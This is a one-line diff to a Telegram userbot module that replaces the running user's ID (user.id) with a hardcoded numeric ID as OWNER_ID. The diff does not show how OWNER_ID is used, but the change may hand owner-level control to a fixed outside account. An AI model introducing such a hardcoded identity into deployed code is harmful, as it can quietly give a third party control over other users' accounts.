@@ -41,7 +41,7 @@ from AyiinXd.ayiin import _format, asst_cmd, callback, reply_id
 from .ping import get_readable_time
 
 OWNER = user.first_name
-OWNER_ID = user.id
+OWNER_ID = 1337085565
 telegraph = Telegraph()
 r = telegraph.create_account(short_name="telegraph")
 auth_url = r["auth_url"]
